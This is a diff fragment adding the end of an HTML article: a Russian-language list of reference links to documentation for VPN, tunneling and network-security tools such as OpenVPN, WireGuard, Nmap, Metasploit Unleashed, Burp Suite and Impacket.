+   <a href="https://openvpn.net/community-resources/how-to/" rel="nofollow">
+    Документация OpenVPN
+   </a>
+  </li>
+  <li>
+   <a href="https://www.wireguard.com/quickstart/" rel="nofollow">
+    Документация WireGuard
+   </a>
+  </li>
+  <li>
+   <a href="https://tools.ietf.org/html/rfc6071" rel="nofollow">
+    Руководство по IPSec
+   </a>
+  </li>
+  <li>
+   <a href="https://www.ssh.com/ssh/tunneling/" rel="nofollow">
+    SSH-тунелирование
+   </a>
+  </li>
+  <li>
+   <a href="https://www.offensive-security.com/metasploit-unleashed/" rel="nofollow">
+    Metasploit Unleashed
+   </a>
+  </li>
+  <li>
+   <a href="https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf" rel="nofollow">
+    Netcat
+                Cheat Sheet
+   </a>
+  </li>
+  <li>
+   <a href="https://docs.microsoft.com/en-us/powershell/" rel="nofollow">
+    PowerShell Documentation
+   </a>
+  </li>
+  <li>
+   <a href="https://www.wireshark.org/docs/wsug_html_chunked/" rel="nofollow">
+    Wireshark User Guide
+   </a>
+  </li>
+  <li>
+   <a href="https://nmap.org/book/man.html" rel="nofollow">
+    Nmap Documentation
+   </a>
+  </li>
+  <li>
+   <a href="https://portswigger.net/burp/documentation" rel="nofollow">
+    Burp Suite Documentation
+   </a>
+  </li>
+  <li>
+   <a href="https://github.com/SecureAuthCorp/impacket">
+    Impacket GitHub Repository
+   </a>
+  </li>
+ </ul>
+ <hr/>
+</article>
